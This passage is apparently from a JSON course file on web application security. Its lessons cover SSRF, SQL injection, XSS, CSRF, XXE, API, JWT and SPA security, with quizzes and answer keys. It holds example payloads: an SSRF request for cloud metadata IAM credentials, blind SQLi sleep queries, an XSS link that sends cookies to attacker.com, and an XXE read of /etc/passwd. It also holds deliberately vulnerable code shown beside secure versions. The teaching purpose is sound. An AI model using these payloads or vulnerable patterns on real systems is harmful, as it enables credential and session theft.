                            "content": "<p>This is the most critical and high-impact SSRF scenario in a cloud environment. All major cloud providers (AWS, Azure, GCP) have a special, non-routable IP address (`169.254.169.254`) called the 'instance metadata service'. A VM can make a request to this IP to get information about itself, including temporary security credentials for its attached IAM role or service account.</p><p>An attacker can use an SSRF vulnerability to force the server to make a request to `http://169.254.169.254/...`. The response will contain the temporary IAM credentials. The attacker can then use these stolen credentials to directly access the cloud provider's APIs and potentially compromise the entire cloud account. This is one of the most severe vulnerabilities in the cloud.</p>",
                            "image": "https://images.unsplash.com/photo-1607513746974-2c6444f49e75?w=800&h=400&fit-crop"
                        },
                        {
                            "title": "SSRF Prevention",
                            "content": "<p>The primary defense is strict input validation.</p><ul><li><strong>Allow-List for Domains:</strong> The best defense. The application should maintain an explicit allow-list of the trusted domains it is allowed to connect to. Any other domain in the user's input should be rejected.</li><li><strong>Deny-Lists (Less effective):</strong> Trying to create a deny-list of bad IPs (like `127.0.0.1` or `169.254.169.254`) is brittle and often easily bypassed by attackers using different IP formats or DNS trickery.</li></ul>",
                            "image": "https://images.unsplash.com/photo-1517694712202-14261e80e3a5?w=800&h=400&fit=crop"
                        }
                    ]
                },
                "codeExamples": [
                    {
                        "title": "Vulnerable SSRF Code (Python/Flask)",
                        "language": "python",
                        "code": "import requests\nfrom flask import request\n\n@app.route('/image-fetch')\ndef image_fetch():\n    # DANGER: The 'url' parameter is taken directly from the user and used\n    # in a server-side request without any validation.\n    image_url = request.args.get('url')\n    image_data = requests.get(image_url)\n    return image_data.content"
                    },
                    {
                        "title": "SSRF Exploit - Cloud Metadata Attack",
                        "language": "http",
                        "code": "# Attacker crafts a URL to hit the AWS Instance Metadata Service.\n# The response from the server will contain the temporary IAM credentials for the server's attached role.\nGET /image-fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/ec2-role-name HTTP/1.1\nHost: vulnerable-app.com"
                    },
                    {
                        "title": "SSRF Exploit - Internal Port Scan",
                        "language": "http",
                        "code": "# Attacker attempts to connect to an internal server's admin port.\n# They can infer if the port is open based on the response time or error message.\nGET /image-fetch?url=http://10.1.1.5:8080/admin HTTP/1.1\nHost: vulnerable-app.com"
                    }
                ],
                "quiz": {
                    "passingScore": 80,
                    "questions": [
                        { "id": 1, "question": "What is Server-Side Request Forgery (SSRF)?", "options": ["An attack where the user's browser is tricked into making a request", "A vulnerability that allows an attacker to force the server to make arbitrary HTTP requests on their behalf", "A type of SQL Injection", "A weak password policy"], "correct": 1, "explanation": "SSRF effectively turns the vulnerable server into a proxy for the attacker, allowing them to pivot and attack systems on the internal network." },
                        { "id": 2, "question": "What is the most severe potential impact of an SSRF vulnerability in a cloud environment?", "options": ["Defacing the website", "Slowing down the server", "Stealing the IAM credentials for the compromised instance by attacking the metadata service", "Causing a stack trace to be displayed"], "correct": 2, "explanation": "The metadata service attack is the holy grail for an attacker who finds an SSRF vulnerability in the cloud, as it can escalate a simple web vulnerability into a full cloud account compromise." },
                        { "id": 3, "question": "What is the most effective defense against SSRF?", "options": ["Using a deny-list of bad IP addresses", "Relying on a WAF", "Maintaining a strict allow-list of the domains the application is permitted to connect to", "Disabling logging"], "correct": 2, "explanation": "An allow-list is a much more robust control than a deny-list. By explicitly defining what is allowed, you prevent attackers from finding clever bypasses." }
                    ]
                }
            },
            {
                "id": "lesson-15-advanced-sqli",
                "title": "Lesson 15: Advanced SQL Injection",
                "duration": "120 min",
                "objectives": [
                    "Understand and exploit Blind SQL Injection vulnerabilities where no data is returned",
                    "Use time-based techniques to exfiltrate data one character at a time",
                    "Leverage UNION-based SQLi to extract data from other tables in the database",
                    "Explore database-specific attack syntax"
                ],
                "content": {
                    "overview": "Not all SQL injections are as simple as a basic authentication bypass. This advanced lesson explores sophisticated SQLi techniques that attackers use when the application doesn't directly return database errors or data in its response. These 'blind' techniques are more complex but just as devastating.",
                    "sections": [
                        {
                            "title": "Blind SQL Injection",
                            "content": "<p>Blind SQL Injection occurs when the application is vulnerable to SQLi, but its HTTP response does not contain any database error messages or the results of the query. The attacker cannot see the data directly. Instead, they must infer the data by asking the database a series of true/false questions.</p><h3>Boolean-based Blind SQLi:</h3><p>An attacker injects a conditional statement. If the statement is true, the page returns normally. If it is false, the page returns differently (e.g., a generic error). The attacker can use this to exfiltrate data one bit at a time. *Example:* `...AND SUBSTRING((SELECT password FROM users WHERE username='admin'), 1, 1) = 'a'`.</p><h3>Time-based Blind SQLi:</h3><p>This is used when the response is identical for both true and false conditions. The attacker injects a command that tells the database to pause for a number of seconds if a condition is true (`...AND (SELECT CASE WHEN (SUBSTRING(password,1,1)='a') THEN sleep(5) ELSE 0 END)`). If the HTTP response takes 5 seconds, the attacker knows the first character is 'a'.</p>",
                            "image": "https://images.unsplash.com/photo-1558494949-ef010cbdcc31?w=800&h=400&fit=crop"
                        },
                        {
                            "title": "UNION-Based Exploitation",
                            "content": "<p>When an application displays the results of a query on the page, an attacker can use the `UNION` SQL operator to combine the results of the legitimate query with the results of a completely different query of their own. This allows them to dump data from any other table in the database and have it displayed directly on the webpage.</p>",
                            "image": "https://images.unsplash.com/photo-1517694712202-14261e80e3a5?w=800&h=400&fit=crop"
                        }
                    ]
                },
                "quiz": {
                    "passingScore": 80,
                    "questions": [
                        { "id": 1, "question": "In what scenario would an attacker resort to using Blind SQL Injection techniques?", "options": ["When they want to delete the database", "When the application does not return database errors or query results in its response", "When the application is not vulnerable to SQLi", "When they have a very fast internet connection"], "correct": 1, "explanation": "Blind SQLi is necessary when there is no direct channel to see the results. The attacker must infer the results based on the application's behavior (a boolean change or a time delay)." },
                        { "id": 2, "question": "Which SQL operator is used to combine the results of two different queries, and is often abused to exfiltrate data from other tables?", "options": ["JOIN", "WHERE", "FROM", "UNION"], "correct": 3, "explanation": "The `UNION` operator is the key to this powerful in-band exfiltration technique." }
                    ]
                }
            },
            {
                "id": "lesson-16-xss-deep-dive",
                "title": "Lesson 16: Cross-Site Scripting (XSS) Deep Dive",
                "duration": "120 min",
                "objectives": [
                    "Exploit Reflected and Stored XSS vulnerabilities",
                    "Understand the client-side nature of DOM-based XSS",
                    "Develop advanced payloads to steal session cookies and perform actions on behalf of the user",
                    "Implement defenses using output encoding and Content Security Policy"
                ],
                "content": {
                    "overview": "Cross-Site Scripting (XSS) is a vulnerability where an attacker is able to inject malicious client-side script (usually JavaScript) into a webpage viewed by other users. This lesson provides a deep dive into the three main types of XSS and demonstrates how attackers leverage them to hijack user sessions and steal data.",
                    "sections": [
                        {
                            "title": "Reflected vs. Stored XSS",
                            "content": "<ul><li><strong>Reflected XSS:</strong> This is the most common type. The malicious script comes from the current HTTP request. An attacker crafts a special URL (e.g., `https://site.com/search?q=<script>...`) and tricks a victim into clicking it. The server 'reflects' the malicious script from the URL back into the HTML of the search results page, and the victim's browser executes it.</li><li><strong>Stored XSS (Persistent XSS):</strong> This is the most dangerous type. The malicious script is permanently stored on the target server, such as in a database comment field or a user profile page. When any user visits that page, their browser will fetch and execute the stored script. A single stored XSS payload can impact every user who views the affected page.</li></ul>",
                            "image": "https://images.unsplash.com/photo-1515879218367-8466d910aaa4?w=800&h=400&fit=crop"
                        },
                        {
                            "title": "DOM-Based XSS",
                            "content": "<p>DOM-based XSS is a more subtle variant where the vulnerability exists entirely in the client-side JavaScript. The malicious payload is never sent to the server. Instead, client-side code reads data from a part of the URL (like the `#fragment`) and insecurely writes it into the Document Object Model (DOM) of the page, causing the script to execute.</p>",
                            "image": "https://images.unsplash.com/photo-1555099962-4199c345e541?w=800&h=400&fit-crop"
                        },
                        {
                            "title": "The Primary Defense: Output Encoding",
                            "content": "<p>The number one defense against XSS is **context-aware output encoding**. Whenever you display user-supplied data on a webpage, you must encode it to prevent the browser from interpreting it as active content. For example, the character `<` should be converted to its HTML entity `&lt;`. This will cause the browser to *display* the text `<script>` rather than *executing* it as a script tag.</p>",
                            "image": "https://images.unsplash.com/photo-1517694712202-14261e80e3a5?w=800&h=400&fit=crop"
                        }
                    ]
                },
                "codeExamples": [
                    {
                        "title": "Vulnerable Reflected XSS Code (PHP)",
                        "language": "php",
                        "code": "<?php\n// DANGER: The 'name' parameter from the URL is printed directly into the HTML\n// without any encoding.\n$name = $_GET['name'];\necho \"<h1>Welcome, \" . $name . \"!</h1>\";\n?>"
                    },
                   {
  "title": "Reflected XSS Payload - Cookie Stealing",
  "language": "http",
  "code": "# Attacker gets a victim to click this link.\n# The script will execute in the victim's browser, in the context of the vulnerable site.\n# It will then send the victim's session cookie to a server controlled by the attacker.\n\nhttps://vulnerable-site.com/welcome.php?name=&lt;script&gt;document.location='http://attacker.com/steal?cookie='+document.cookie&lt;/script&gt;"
},
                    {
                        "title": "Secure Output Encoding (PHP)",
                        "language": "php",
                        "code": "<?php\n// CORRECT: The htmlspecialchars() function encodes the special characters,\n// preventing them from being interpreted as HTML by the browser.\n$name = $_GET['name'];\necho \"<h1>Welcome, \" . htmlspecialchars($name, ENT_QUOTES, 'UTF-8') . \"!</h1>\";\n?>"
                    }
                ],
                "quiz": {
                    "passingScore": 80,
                    "questions": [
                        { "id": 1, "question": "An attacker posts a malicious script in the comment section of a blog. Every user who views that blog post then has their session cookie stolen. This is an example of what?", "options": ["Reflected XSS", "Stored (Persistent) XSS", "DOM-based XSS", "SQL Injection"], "correct": 1, "explanation": "It is 'stored' because the malicious payload is saved permanently on the server's database and served to every visitor, making it highly impactful." },
                        { "id": 2, "question": "What is the primary defense against Cross-Site Scripting?", "options": ["Using HTTPS", "Context-aware output encoding of all user-supplied data", "Hashing user passwords", "Using a long session token"], "correct": 1, "explanation": "Properly encoding user-controlled output ensures that the browser will always treat it as text to be displayed, rather than as code to be executed. This is the fundamental fix for XSS." }
                    ]
                }
            },
            {
                "id": "lesson-17-csrf",
                "title": "Lesson 17: Cross-Site Request Forgery (CSRF)",
                "duration": "120 min",
                "objectives": [
                    "Understand how CSRF tricks a victim's browser into performing unwanted actions",
                    "Differentiate between CSRF and XSS",
                    "Exploit CSRF vulnerabilities in forms and state-changing requests",
                    "Implement the synchronizer token pattern as the primary defense"
                ],
                "content": {
                    "overview": "Cross-Site Request Forgery (CSRF) is an attack that forces an end user to execute unwanted actions on a web application in which they're currently authenticated. An attacker can use CSRF to make a victim change their email address, transfer funds, or perform any other state-changing action without their consent.",
                    "sections": [
                        {
                            "title": "CSRF Attack Explained",
                            "content": "<p>The attack relies on the fact that browsers automatically include any cookies (including session cookies) for a domain with every request to that domain.</p><h3>The Attack Flow:</h3><ol><li>A victim logs in to their trusted banking site, `bank.com`. Their browser now has a valid session cookie for `bank.com`.</li><li>The victim then browses to a different, malicious website, `evil.com`, controlled by the attacker.</li><li>This malicious page contains a hidden form that is automatically submitted to the banking site as soon as the page loads. The form is designed to perform a sensitive action, like transferring funds: `<form action=\"https://bank.com/transfer\" method=\"post\">`.</li><li>When the victim's browser submits this form, it will automatically and helpfully include the `bank.com` session cookie.</li><li>From the perspective of `bank.com`, this is a legitimate request. It came from an authenticated user (it has the valid session cookie) and contains all the correct parameters. The transfer is made.</li></ol>",
                            "image": "https://images.unsplash.com/photo-1548092372-6a7e3206a5a2?w=800&h=400&fit=crop"
                        },
                        {
                            "title": "Primary Defense: Anti-CSRF Tokens",
                            "content": "<p>The standard defense is the Synchronizer Token Pattern.</p><h3>How it Works:</h3><ol><li>When the server first renders a form (like the fund transfer form), it generates a large, random, and unique token (the 'anti-CSRF token').</li><li>It stores this token in the user's session on the server-side.</li><li>It also embeds this token into the form as a hidden input field.</li><li>When the user legitimately submits the form, the token is sent back.</li><li>The server then validates that the token submitted in the form *matches* the token stored in the user's session.</li></ol><p>This breaks a CSRF attack because the attacker on `evil.com` has no way of knowing what the correct token value is for the victim's session. Any request they forge will be missing the valid token and will be rejected by the server.</p>",
                            "image": "https://images.unsplash.com/photo-1517694712202-14261e80e3a5?w=800&h=400&fit=crop"
                        }
                    ]
                },
                "quiz": {
                    "passingScore": 80,
                    "questions": [
                        { "id": 1, "question": "What is the core idea behind a Cross-Site Request Forgery (CSRF) attack?", "options": ["Injecting scripts into a webpage", "Tricking an authenticated user's browser into submitting a malicious, state-changing request to a trusted site", "Stealing data from a database", "Bypassing a login form"], "correct": 1, "explanation": "CSRF is all about abusing the trust a website has in its authenticated users by forging requests from their browsers." },
                        { "id": 2, "question": "What is the standard and most effective defense against CSRF?", "options": ["Using HTTPS", "A strong password policy", "A unique, unpredictable anti-CSRF token included in all state-changing requests", "Scanning for viruses"], "correct": 2, "explanation": "The anti-CSRF token acts as a secret that only the legitimate user's browser could know, proving that the request originated from the trusted application itself, not from a malicious third-party site." }
                    ]
                }
            },
            {
                "id": "lesson-18-xxe",
                "title": "Lesson 18: XML External Entity (XXE) Attacks",
                "duration": "120 min",
                "objectives": [
                    "Understand how XXE vulnerabilities arise from insecure XML parsers",
                    "Exploit XXE to read arbitrary local files from the server",
                    "Use out-of-band techniques to exfiltrate data with blind XXE",
                    "Secure XML parsers to prevent XXE"
                ],
                "content": {
                    "overview": "Many older applications accept data in the Extensible Markup Language (XML) format. If the XML parser is misconfigured to process external entities from an untrusted source, it can lead to a critical XML External Entity (XXE) vulnerability, allowing an attacker to read local files, perform SSRF, and more.",
                    "sections": [
                        {
                            "title": "XXE Attack Vectors",
                            "content": "<p>The vulnerability exists because some XML parsers will process a 'Document Type Definition' (DTD) which can include an 'external entity'. An attacker can define an external entity that points to a local file on the server. When the parser expands this entity, it will replace it with the contents of the file.</p><h3>Exploiting XXE to Read a File:</h3><p>An attacker can submit an XML payload that defines an entity `xxe` to be the contents of `/etc/passwd`. They then reference this entity within a data field. The XML parser will read the file and place its contents into the XML, which may then be returned to the user in the HTTP response, leaking the sensitive file.</p>",
                            "image": "https://images.unsplash.com/photo-1542831371-d531d209121f?w=800&h=400&fit=crop"
                        },
                        {
                            "title": "Blind and Out-of-Band XXE",
                            "content": "<p>In a 'blind' XXE vulnerability, the application processes the XML but does not return the results in its response. An attacker can still exploit this by defining an external entity that makes an out-of-band request to a server they control, with the contents of the local file embedded in the URL. This exfiltrates the data over a different channel.</p>",
                            "image": "https://images.unsplash.com/photo-1517694712202-14261e80e3a5?w=800&h=400&fit=crop"
                        }
                    ]
                },
                "codeExamples": [
                    {
                        "title": "XXE Payload to Read a Local File",
                        "language": "xml",
                        "code": "<!-- An attacker submits this XML payload to the application -->\n<?xml version=\"1.0\" ?>\n<!DOCTYPE foo [ \n    <!ENTITY xxe SYSTEM \"file:///etc/passwd\"> \n]>\n<stockCheck>\n    <productId>&xxe;</productId>\n    <storeId>1</storeId>\n</stockCheck>"
                    },
                    {
                        "title": "Vulnerable XXE Code (Java)",
                        "language": "java",
                        "code": "import javax.xml.parsers.DocumentBuilder;\nimport javax.xml.parsers.DocumentBuilderFactory;\n\n// ...\n// DANGER: The default DocumentBuilderFactory is vulnerable to XXE.\nDocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();\nDocumentBuilder db = dbf.newDocumentBuilder();\nDocument doc = db.parse(request.getInputStream()); // Vulnerability is triggered here."
                    },
                    {
                        "title": "Secure XML Parsing Code (Java)",
                        "language": "java",
                        "code": "import javax.xml.parsers.DocumentBuilderFactory;\n\n// CORRECT: The code explicitly disables DTDs and external entities,\n// which mitigates XXE vulnerabilities.\nDocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();\ndbf.setFeature(\"http://apache.org/xml/features/disallow-doctype-decl\", true);\ndbf.setFeature(\"http://xml.org/sax/features/external-general-entities\", false);\ndbf.setFeature(\"http://xml.org/sax/features/external-parameter-entities\", false);\n// ..."
                    }
                ],
                "quiz": {
                    "passingScore": 80,
                    "questions": [
                        { "id": 1, "question": "What is the root cause of an XXE vulnerability?", "options": ["A misconfigured XML parser that processes untrusted external entities", "A SQL database that is not patched", "A weak password", "A missing firewall rule"], "correct": 0, "explanation": "The vulnerability lies specifically within the XML parser's configuration and its willingness to resolve external entities defined in user-supplied data." },
                        { "id": 2, "question": "A successful XXE attack can often lead to what?", "options": ["The ability to read arbitrary files from the server's local file system", "A denial of service attack", "A cross-site scripting attack", "A stronger password"], "correct": 0, "explanation": "Reading local files (like `/etc/passwd` or configuration files with passwords) is the classic and most common impact of an XXE vulnerability." }
                    ]
                }
            },
            {
                "id": "lesson-19-api-security",
                "title": "Lesson 19: API Security Testing",
                "duration": "120 min",
                "objectives": [
                    "Understand common security vulnerabilities in REST and GraphQL APIs",
                    "Exploit Broken Object Level Authorization (BOLA) in an API context",
                    "Test for Mass Assignment vulnerabilities that modify unintended fields",
                    "Identify and test for API rate limiting and resource limit bypasses"
                ],
                "content": {
                    "overview": "As applications move to a client-side/API model, the API itself becomes the primary attack surface. This lesson covers vulnerabilities that are particularly common in modern APIs, building on the OWASP API Security Top 10.",
                    "sections": [
                        {
                            "title": "Broken Object Level Authorization (BOLA)",
                            "content": "<p>BOLA is OWASP's API Security #1 vulnerability. It is identical to the Insecure Direct Object Reference (IDOR) we covered in Lesson 5, but applied to an API context. The endpoint receives an ID for an object (e.g., `/api/users/123`) and fails to verify that the authenticated user making the request is authorized to access that specific object.</p>",
                            "image": "https://images.unsplash.com/photo-1555949963-aa79dcee981c?w=800&h=400&fit=crop"
                        },
                        {
                            "title": "Mass Assignment",
                            "content": "<p>Mass assignment vulnerabilities occur when an application automatically binds client-sent data into internal objects. Modern frameworks do this for convenience. An attacker can exploit this by passing extra fields in their request that they are not supposed to control.</p><p>For example, a user profile update endpoint might expect a `firstName` and `lastName`. An attacker might add an extra field to their JSON request: `\"isAdmin\": true`. If the server-side object also has an `isAdmin` property, the framework might automatically 'assign' this `true` value to the user object, unintentionally escalating the attacker's privileges.</p>",
                            "image": "https://images.unsplash.com/photo-1517694712202-14261e80e3a5?w=800&h=400&fit=crop"
                        }
                    ]
                },
                "quiz": {
                    "passingScore": 80,
                    "questions": [
                        { "id": 1, "question": "What is the number one most common API vulnerability, also known as IDOR?", "options": ["Mass Assignment", "Broken Object Level Authorization (BOLA)", "SQL Injection", "Weak Encryption"], "correct": 1, "explanation": "BOLA (IDOR) is the most prevalent API vulnerability, arising from the failure to perform object-level authorization checks." },
                        { "id": 2, "question": "An attacker updates their user profile and adds `\"role\":\"admin\"` to the JSON request, successfully making themselves an administrator. This is an example of what?", "options": ["BOLA", "Injection", "Mass Assignment", "CSRF"], "correct": 2, "explanation": "This is a classic mass assignment attack, where the attacker is able to modify internal object properties that should not be client-controllable." }
                    ]
                }
            },
            {
                "id": "lesson-20-jwt-security",
                "title": "Lesson 20: JSON Web Token (JWT) Security",
                "duration": "120 min",
                "objectives": [
                    "Understand the structure of a JWT (Header, Payload, Signature)",
                    "Identify and exploit the `alg:none` algorithm confusion attack",
                    "Recognize weak secret keys used for signing tokens",
                    "Test for token manipulation and signature stripping vulnerabilities"
                ],
                "content": {
                    "overview": "JSON Web Tokens (JWTs) are the most common standard for creating access tokens in modern applications. While a powerful technology, they are often implemented incorrectly, leading to critical authentication vulnerabilities. This lesson covers the common attacks against JWT implementations.",
                    "sections": [
                        {
                            "title": "JWT Structure",
                            "content": "<p>A JWT consists of three parts, separated by dots: `header.payload.signature`.</p><ul><li><strong>Header (Base64URL encoded):</strong> Contains metadata about the token, most importantly the signing algorithm (`alg`) used.</li><li><strong>Payload (Base64URL encoded):</strong> Contains the 'claims' about the user (e.g., `\"sub\": \"12345\"`, `\"user\": \"bob\"`, `\"isAdmin\": false`).</li><li><strong>Signature:</strong> The header and payload are signed with a secret key using the specified algorithm. The server uses this signature to verify that the token has not been tampered with.</li></ul><div class='info-box tip'><div class='info-box-header'><i class='fas fa-lightbulb'></i><strong>Encoded, Not Encrypted</strong></div><p>A common misconception. The header and payload are Base64URL encoded, which is easily reversible. Anyone who has the token can see its contents. JWTs are for proving integrity (that the data wasn't changed), not confidentiality.</p></div>",
                            "image": "https://images.unsplash.com/photo-1599373922312-5b9340d8a5a5?w=800&h=400&fit=crop"
                        },
                        {
                            "title": "Common JWT Attacks",
                            "content": "<ul><li><strong>`alg:none` (Algorithm Confusion):</strong> An attacker takes a real JWT, changes the algorithm in the header to `none`, modifies the payload (e.g., changes `\"isAdmin\": false` to `\"isAdmin\": true`), and then removes the signature. Some poorly implemented libraries will see `alg:none` and 'verify' the token without checking for a signature at all.</li><li><strong>Weak Secret Keys:</strong> The HS256 algorithm uses a shared secret key. If this key is weak or easily guessable, an attacker can brute-force it. Once they have the key, they can forge any token they want with a valid signature.</li></ul>",
                            "image": "https://images.unsplash.com/photo-1542831371-d531d209121f?w=800&h=400&fit=crop"
                        }
                    ]
                },
                "quiz": {
                    "passingScore": 80,
                    "questions": [
                        { "id": 1, "question": "Is the payload of a standard JWT encrypted?", "options": ["Yes, it is always fully encrypted", "No, it is only Base64URL encoded and can be read by anyone"], "correct": 1, "explanation": "This is a critical concept. JWTs are for integrity and authentication, not confidentiality. You should never store sensitive, secret data in a JWT payload." },
                        { "id": 2, "question": "What is the `alg:none` attack?", "options": ["A way to encrypt a token", "An attack where the attacker changes the token's algorithm header to 'none' and removes the signature, hoping a misconfigured server will accept it as valid", "A method for making tokens stronger", "An algorithm for hashing passwords"], "correct": 1, "explanation": "This attack takes advantage of a flaw in some JWT libraries that trust the `alg` header sent by the client, which is a violation of security best practices." }
                    ]
                }
            },
            {
                "id": "lesson-21-spa-security",
                "title": "Lesson 21: Single Page Application (SPA) Security",
                "duration": "120 min",
                "objectives": [
                    "Identify security risks specific to client-side applications built with frameworks like React, Angular, and Vue",
                    "Prevent the exposure of sensitive data in client-side JavaScript code",
                    "Understand how to securely manage JWTs and session tokens in a SPA",
                    "Defend against DOM-based XSS and other client-side vulnerabilities"
                ],
                "content": {
                    "overview": "Single Page Applications (SPAs) move a significant amount of application logic to the client's browser. This creates a different set of security challenges compared to traditional server-side rendered applications. This lesson covers the unique security risks of modern SPAs.",
                    "sections": [
                        {
                            "title": "Client-Side Data Exposure",
                            "content": "<p>In a SPA, a large amount of JavaScript code is downloaded to the client. An attacker can read all of this code. Developers must be extremely careful not to embed any sensitive information in their client-side code.</p><h3>Common Mistakes:</h3><ul><li><strong>Hard-coded API Keys:</strong> Embedding a third-party API key directly in a JavaScript file. An attacker can easily find this and abuse your key.</li><li><strong>Exposure of API Endpoints:</strong> All the API endpoints the application uses are visible in the JavaScript, giving an attacker a complete map of your backend API surface. This makes API security (Lesson 19) even more critical.</li></ul>",
                            "image": "https://images.unsplash.com/photo-1515879218367-8466d910aaa4?w=800&h=400&fit-crop"
                        },
                        {
                            "title": "Secure Token Storage in the Browser",
                            "content": "<p>A major challenge for SPAs is where to securely store the JWT or session token. There are two main options, each with trade-offs:</p><ul><li><strong>`localStorage` / `sessionStorage`:</strong> **Pros:** Easy to use. **Cons:** Tokens stored here are accessible to any script on the same origin. This means a simple XSS vulnerability can lead to the complete theft of the user's JWT, allowing for a full session hijack.</li><li><strong>HttpOnly Secure Cookies:</strong> **Pros:** Not accessible to JavaScript, which protects them from being stolen via XSS. **Cons:** Susceptible to Cross-Site Request Forgery (CSRF) if not properly protected with `SameSite` attributes.</li></ul><p>Using HttpOnly cookies is often recommended, provided that strong `SameSite` and anti-CSRF token defenses are also implemented.</p>",
                            "image": "https://images.unsplash.com/photo-1555066931-4365d14bab8c?w=800&h=400&fit=crop"
                        }
                    ]
                },
                "quiz": {
                    "passingScore": 80,
                    "questions": [
                        { "id": 1, "question": "What is a primary security risk of storing a JWT in the browser's `localStorage`?", "options": ["It can be stolen by an attacker who finds a Cross-Site Scripting (XSS) vulnerability", "It takes up too much space", "It is vulnerable to CSRF", "It expires too quickly"], "correct": 0, "explanation": "Any script running on the page can read from `localStorage`, making XSS the primary vector for stealing these tokens." }
                    ]
                }
            },
            {
                "id": "lesson-22-mobile-web-security",
                "title": "Lesson 22: Mobile Web Application Security",
                "duration": "120 min",
                "objectives": [
                    "Identify vulnerabilities specific to mobile web applications",
                    "Understand security considerations of touch interfaces",
                    "Recognize differences between mobile and desktop browsers",
                    "Assess the security of Progressive Web Apps (PWAs)"
                ],
                "content": {
                    "overview": "While many of the same principles apply, testing a mobile web application has unique considerations. This lesson explores the differences in attack surface and technology between desktop and mobile browsers, and how to adapt your testing methodology accordingly.",
                    "sections": [
                        {
                            "title": "Mobile-Specific Vulnerabilities",
                            "content": "<p>Mobile browsers and the applications they render often have different features that can lead to new vulnerabilities.</p><h3>Areas of Focus:</h3><ul><li><strong>Insecure Deep Linking:</strong> Mobile apps can register custom URI schemes (e.g., `myapp://`). If these deep links are not properly validated, an attacker could craft a malicious link on a webpage that, when clicked, opens the native app on the user's phone and makes it perform a sensitive action.</li><li><strong>Progressive Web App (PWA) Security:</strong> PWAs have access to more browser features, like background service workers and a web app manifest. Misconfigurations in these components can create new security risks.</li><li><strong>Different Rendering Engine:</strong> Mobile browsers often have slightly different rendering engines and JavaScript interpreters, which can sometimes lead to browser-specific XSS or other bypasses.</li></ul>",
                            "image": "https://images.unsplash.com/photo-1585250184288-5175908b083c?w=800&h=400&fit=crop"
                        }
                    ]
                },
                "quiz": {
                    "passingScore": 80,
                    "questions": [
                        { "id": 1, "question": "A custom URI like `myapp://action?parameter=value` is known as a:", "options": ["URL", "Deep Link", "Session Cookie", "JWT"], "correct": 1, "explanation": "Deep links are used to launch a native mobile application from a web browser. Insecure handling of the parameters in a deep link is a common mobile vulnerability." }
                    ]
                }
            },
            {
                "id": "lesson-23-automated-testing",
                "title": "Lesson 23: Automated Security Testing",
                "duration": "120 min",
                "objectives": [
                    "Integrate a SAST tool into a CI/CD pipeline",
                    "Configure and run an automated DAST scan",
                    "Incorporate security testing into every stage of the DevOps lifecycle"
                ],
                "content": {
                    "overview": "To secure applications at scale, security testing must be automated. This DevSecOps-focused lesson covers how to integrate the major types of security scanners directly into a CI/CD pipeline, enabling you to find vulnerabilities automatically before they reach production.",
                    "sections": [
                        {
                            "title": "CI/CD Security Pipeline",
                            "content": "<p>A secure pipeline integrates security at multiple stages.</p><h3>Example Pipeline:</h3><ol><li><strong>Commit Stage:</strong> A developer commits code. Pre-commit hooks might run to check for hard-coded secrets.</li><li><strong>Build Stage:</strong> The code is checked out on a build server. Here, you would run your fast, automated tests:<ul><li>**Software Composition Analysis (SCA):** Check for vulnerable dependencies.</li><li>**Static Application Security Testing (SAST):** Scan your source code for flaws.</li></ul>If any of these scans find a critical issue, the build fails.</li><li><strong>Test/Staging Stage:</strong> If the build is successful, the application is deployed to a staging environment. Here, you can run longer-running tests:<ul><li>**Dynamic Application Security Testing (DAST):** Run a tool like OWASP ZAP to scan the running application for vulnerabilities.</li></ul></li><li><strong>Production Stage:</strong> If all tests pass, the application is deployed to production.</li></ol>",
                            "image": "https://images.unsplash.com/photo-1498050108023-c5249f4df085?w=800&h=400&fit=crop"
                        }
                    ]
                },
                "codeExamples": [
                    {
                        "title": "GitHub Action for SAST with CodeQL",
                        "language": "yaml",
                        "code": "# This GitHub Action will run a CodeQL SAST scan on every push to the main branch.\nname: \"CodeQL\"\n\non:\n  push:\n    branches: [ main ]\n  pull_request:\n    branches: [ main ]\n\njobs:\n  analyze:\n    runs-on: ubuntu-latest\n    steps:\n    - name: Checkout repository\n      uses: actions/checkout@v2\n\n    - name: Initialize CodeQL\n      uses: github/codeql-action/init@v1\n\n    - name: Autobuild\n      uses: github/codeql-action/autobuild@v1\n\n    - name: Perform CodeQL Analysis\n      uses: github/codeql-action/analyze@v1"
                    }
                ],
                "quiz": {
                    "passingScore": 80,
                    "questions": [
                        { "id": 1, "question": "What does the term 'failing the build' mean in a DevSecOps context?", "options": ["The application crashes in production", "A security scanner integrated into the CI/CD pipeline finds a high-severity vulnerability and automatically stops the deployment process", "A developer fails their performance review", "The server runs out of memory"], "correct": 1, "explanation": "Failing the build is the key automated control in a DevSecOps pipeline. It acts as a security gate, preventing code with known, high-risk vulnerabilities from proceeding." }
                    ]
                }
            },
            {
                "id": "lesson-24-manual-code-review",
                "title": "Lesson 24: Manual Code Review",
                "duration": "120 min",
                "objectives": [
                    "Understand the value of manual secure code review beyond automated scanning",
                    "Follow a structured methodology for reviewing code for security flaws",
                    "Identify vulnerabilities, like business logic flaws, that scanners cannot find"
                ],
                "content": {
                    "overview": "Automated scanners are good at finding common, known vulnerability patterns. However, they cannot understand business logic or find complex, chained vulnerabilities. This is where manual secure code review comes in. This lesson covers the process and mindset for reviewing source code for security flaws.",
                    "sections": [
                        {
                            "title": "The Code Review Process",
                            "content": "<p>A secure code review is a systematic examination of an application's source code to find security vulnerabilities.</p><h3>The Hybrid Approach:</h3><p>The most effective approach is to first run an automated SAST scan to find all the low-hanging fruit. Then, as a human reviewer, you can focus on the areas that require human intelligence:</p><ul><li><strong>Validate SAST Findings:</strong> Are the issues found by the scanner actual vulnerabilities, or are they false positives?</li><li><strong>Look for Logic Flaws:</strong> This is the most important part. Trace the business logic of the application. Could a user abuse a workflow by calling steps in the wrong order? Can they manipulate prices? Scanners cannot find these flaws.</li><li><strong>Follow User Input:</strong> Trace all user-controlled input through the application. See how it is validated, processed, and where it ends up. This is a primary way to find injection and XSS flaws.</li></ul>",
                            "image": "https://images.unsplash.com/photo-1555099962-4199c345e541?w=800&h=400&fit=crop"
                        }
                    ]
                },
                "quiz": {
                    "passingScore": 80,
                    "questions": [
                        { "id": 1, "question": "What is the primary advantage of manual secure code review over automated SAST scanning?", "options": ["It is faster", "It can identify business logic flaws and other complex vulnerabilities that automated tools cannot understand", "It is cheaper", "It finds fewer vulnerabilities"], "correct": 1, "explanation": "Human intelligence is necessary to understand the context and business logic of an application, which is where the most subtle and often most severe vulnerabilities lie." }
                    ]
                }
            },
            {
                "id": "lesson-25-business-logic-testing",
                "title": "Lesson 25: Business Logic Vulnerability Assessment",
                "duration": "150 min",
                "objectives": [
                    "Identify and exploit business logic flaws in application workflows",
                    "Test for race conditions and other timing attacks",
